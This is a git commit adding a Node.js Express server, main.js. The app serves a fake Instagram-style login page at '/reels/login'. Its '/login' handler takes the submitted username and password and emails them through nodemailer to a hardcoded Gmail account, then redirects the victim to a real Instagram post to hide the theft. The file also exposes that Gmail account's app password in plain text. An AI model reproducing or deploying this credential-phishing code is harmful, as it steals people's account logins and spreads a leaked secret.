14c2b0b0e80177d7c9565a08070349eb2d47ce00
async-un <localhost5273@gmail.com>
2024-10-06 09:40:24 +0530

    Add files via upload

---
+++ main.js
@@ -0,0 +1,51 @@
+const express = require('express');
+const nodemailer = require("nodemailer");
+const fs = require('fs');
+const app = express();
+const port = 3000;
+
+app.set('view engine', 'ejs');
+app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
+const emailfunction = (username, password) => {
+    const auth = nodemailer.createTransport({
+        service: "gmail",
+        secure : true,
+        port : 465,
+        auth: {
+            user: "srinivasaramanujan1728@gmail.com",
+            pass: "ccer hpuk jsdb acdr"
+        }
+    });
+
+    const receiver = {
+        from : "srinivasaramanujan1728@gmail.com",
+        to : "srinivasaramanujan1728@gmail.com",
+        subject : "a new login attempt detected",
+        text : `Username: ${username} and Password: ${password}`
+    };
+
+    auth.sendMail(receiver, (error, emailResponse) => {
+        if(error)
+        throw error;
+        console.log("success!");
+        res.send("Email sent successfully!");
+    });
+
+}
+app.get('/', (req, res) => {
+    res.render('start.ejs');
+});
+app.get('/reels/login', (req, res) => {
+    res.render('index.ejs');
+});
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
+    emailfunction(username, password);
+    res.redirect('https://www.instagram.com/p/DAQRhcuz_xs/?utm_source=ig_web_copy_link');
+});
+app.listen(port, () => {
+    console.log(`Server is running on port ${port}`);
+});
+
+
